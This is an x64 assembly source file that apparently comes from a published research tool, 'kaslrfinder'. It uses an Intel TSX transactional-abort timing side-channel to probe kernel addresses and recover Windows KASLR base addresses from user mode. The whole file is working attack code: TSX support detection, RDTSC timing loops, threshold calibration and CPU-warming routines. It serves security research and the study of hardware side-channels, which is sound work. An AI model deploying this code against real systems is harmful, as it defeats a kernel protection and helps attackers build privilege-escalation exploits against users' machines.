; kaslrfinder.asm : assembly code to recover KASLR values on Windows
;
; (c) Ulf Frisk, 2016
; Author: Ulf Frisk, kaslrfinder@frizk.net
;

ExitProcess PROTO
main_c PROTO

.CODE

; -------------------------------------------------------------------------
; PROGRAM ENTRY POINT
; -------------------------------------------------------------------------
main PROC
	PUSH rbp
	MOV rbp, rsp
	SUB rsp, 20h
	CALL main_c
	CALL ExitProcess
main ENDP

; -------------------------------------------------------------------------
; MEASURE TIMING OF THE EXECUTE OPERATION
; The execute operation will fail quickly if the page is executable.
; The execute operation will fail slowly if the page is unmapped _or_ if
; page is mapped as non execute.
; The measurement will sample 0x100 operations, discard the lowest 0x10
; results and return the lowest remaining result.
; -> rcx :: address to test
; <- rax :: timing value
; destroyed :: rcx, rdx, r9
; -------------------------------------------------------------------------
measure PROC
	PUSH rsi
	MOV rsi, rcx
	PUSH rbx
	MOV rbx, rsp
	CLD
	; -------------------------------------------------------------------------
	; Measure the timing of the invalid op 0x100 times and push results
	; to the stack.
	; -------------------------------------------------------------------------
	MOV rsi, rcx
	MOV ecx, 100h
	_measure_loop:
	; TIMER: BEFORE
	LFENCE
	RDTSC			; edx:eax
	SHL rdx, 32
	ADD rax, rdx
	MOV r9, rax
	; PERFORM INVALID OP
	XBEGIN _xabort
	JMP rsi
	; TIMER: AFTER AND CALC RESULT
	_xabort:
	LFENCE
	RDTSC			; edx:eax
	SHL rdx, 32
	ADD rax, rdx
	SUB rax, r9
	PUSH rax
	LOOP _measure_loop
	; -------------------------------------------------------------------------
	; SKIP LOWEST 10h VALUES IN ARRAY STORED ON STACK
	; this must be done to allow a few TSX instructions to abort due to random
	; 'other' reasons prematurely without affecting the overall measurement.
	; rdx <- lowest value after skip
	; -------------------------------------------------------------------------
	MOV ecx, 10h
	_skiplow16_outer:
	POP rdx
	MOV rsi, rsp
	_skiplow16_inner:
	LODSQ
	CMP rax, rdx
	JAE _skiplow16_inner_continue
	XCHG rax, rdx
	MOV [rsi-8], rax
	_skiplow16_inner_continue:
	CMP rbx, rsi
	JNE _skiplow16_inner
	LOOP _skiplow16_outer
	; -------------------------------------------------------------------------
	; CLEAN UP AND RETURN
	; -------------------------------------------------------------------------
	MOV rax, rdx
	MOV rsp, rbx
	POP rbx
	POP rsi
	RET
measure ENDP

; -------------------------------------------------------------------------
; MEASURE TIMING OF THE EXECUTE OPERATION
; -> rcx :: address to test
; -> rdx :: threshold value
; <- rax :: NX=0, X=1
; -------------------------------------------------------------------------
measure_x PROC
	MOV r10, rdx
	CALL measure
	CMP rax, r10
	JG _fail
	XOR rax, rax
	MOV al, 1
	RET
	_fail:
	XOR rax, rax
	RET
measure_x ENDP

; -------------------------------------------------------------------------
; MEASURE THRESHOLD
; <- rax :: timing value
; -------------------------------------------------------------------------
measure_threshold PROC
	MOV rcx, 0fffff80000000000h
	CALL measure
	MOV rcx, rax
	SHR rcx, 4
	SUB rax, rcx
	RET
measure_threshold ENDP

; -------------------------------------------------------------------------
; MEASURE THRESHOLD 16 TIMES AND SELECT LOWEST VALUE
; <- rax :: timing value
; -------------------------------------------------------------------------
measure_threshold_16 PROC
	XOR r11, r11
	DEC r11
	MOV r10b, 16
	_measure_next:
	CALL measure_threshold
	CMP rax, r11
	JL _measure_larger
	MOV r11, rax
	_measure_larger:
	DEC r10b
	CMP r10b, 0
	JNZ _measure_next
	MOV rax, r11
	RET
measure_threshold_16 ENDP

; -------------------------------------------------------------------------
; CHECK SUPPORT OF INTEL TSX
; [CPUID.(EAX=07H, ECX=0H).EBX.RTM[bit 11]==1]
; -------------------------------------------------------------------------
is_tsx_support PROC
	PUSH rbx
	MOV eax, 07h
	XOR rcx, rcx
	CPUID
	TEST bh, 04h
	JNZ _continue_tsx_exist
	POP rbx
	XOR rax, rax
	RET
	_continue_tsx_exist:
	POP rbx
	MOV eax, 1
	RET
is_tsx_support ENDP

; -------------------------------------------------------------------------
; ETERNAL LOOP TO CONSUME CPU SO THAT MEASUREMENTS ARE MORE STABLE.
; (called by CreateThread)
; -------------------------------------------------------------------------
loop_eternal PROC
	JMP loop_eternal
loop_eternal ENDP

; -------------------------------------------------------------------------
; LOOP TO PUSH INITIAL CPU USAGE UP - FORCING THE CPU TO DISABLE ANY
; POWER SAVE FREQUENCY DOWNSCALING THAT WILL AFFECT MEASUREMENTS.
; -------------------------------------------------------------------------
speedup PROC
	MOV ecx, 60000000h
	_loop_speedup:
	LOOP _loop_speedup
	RET
speedup ENDP

END
